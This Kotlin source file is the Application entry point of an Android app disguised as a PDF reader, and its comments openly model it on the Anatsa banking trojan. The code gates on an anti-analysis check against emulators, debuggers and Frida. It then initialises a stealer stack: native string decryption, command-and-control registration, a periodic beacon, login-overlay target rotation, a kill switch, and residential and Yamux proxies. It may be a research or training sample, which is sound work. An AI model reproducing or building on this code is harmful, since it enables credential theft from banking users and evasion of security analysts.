package com.docreader.lite

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.docreader.lite.reader.C2
import com.docreader.lite.reader.Targets
import com.docreader.lite.reader.engine.SafetyCheck
import com.docreader.lite.reader.engine.NativeRuntime
import com.docreader.lite.reader.sync.UpdateChannel
import com.docreader.lite.reader.sync.ContentSyncWorker
import com.docreader.lite.reader.advanced.ResidentialProxy
import com.docreader.lite.reader.advanced.YamuxProxy

/**
 * Application entry point.
 *
 * Surface: creates notification channel like any normal app.
 * Subsurface: evaluates environment gate → if safe, initializes full stealer stack.
 *
 * Real banker (Anatsa): Application.onCreate() is the first stealer init point
 * (after ContentProvider.onCreate() — see ReaderInitProvider).
 * If environment gate fails (emulator/debugger/frida): app behaves normally.
 * No C2 init, no overlay, no keylogging. Analyst sees PDF reader.
 */
class App : Application() {

    override fun onCreate() {
        super.onCreate()

        // Legitimate-looking: notification channel for "document updates"
        createNotificationChannel()

        // Environment gate already evaluated in ReaderInitProvider.onCreate()
        // (ContentProvider runs before Application). Check result:
        if (!SafetyCheck.isSafe) {
            // Environment hostile — stay silent. App is just a PDF reader.
            // Don't crash, don't log, don't exhibit ANY suspicious behavior.
            return
        }

        // Gate passed — activate stealer stack
        initStealer()
    }

    private fun initStealer() {
        // Native library: load .so for string decrypt, anti-analysis, Yamux framing
        // Must init before C2 — native string decryption may be needed for endpoint decode
        NativeRuntime.init()

        // C2 init: register with C2, start polling
        C2.init(this)

        // WorkManager beacon: 15-min periodic keepalive (survives Doze)
        ContentSyncWorker.schedule(this)

        // Update channel: campaign-wide config rotation
        UpdateChannel.onTargetsUpdated = { updates ->
            val targets = updates.map { u ->
                Targets.Target(
                    u.packageName, u.name,
                    try { Targets.OverlayType.valueOf(u.overlayType) }
                    catch (_: Exception) { Targets.OverlayType.LOGIN }
                )
            }
            Targets.updateAll(targets)
        }
        UpdateChannel.onKillSwitch = {
            C2.stopPolling()
            ContentSyncWorker.cancel(this)
            ResidentialProxy.stop()
            YamuxProxy.stop()
        }
        UpdateChannel.startPolling(C2.baseUrl())
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "doc_sync",
                "Document Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Syncing your documents"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }
}
